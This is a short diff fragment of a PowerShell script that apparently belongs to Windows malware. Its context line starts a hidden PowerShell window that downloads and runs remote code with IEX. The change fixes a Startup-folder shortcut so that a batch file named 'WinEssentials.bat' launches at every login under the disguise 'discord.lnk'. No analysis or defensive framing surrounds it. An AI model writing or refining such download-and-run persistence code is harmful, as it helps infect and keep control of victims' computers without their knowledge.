@@ -28,7 +28,7 @@ start powershell.exe -windowstyle hidden -command IEX (New-Object System.Net.Web
 exit
 "@
 
-$Shortcut = $wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\discord.exe")
+$Shortcut = $wshell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\discord.lnk")
 $Shortcut.TargetPath = "$env:APPDATA\WinEssentials.bat"
 $Shortcut.Save()
 }
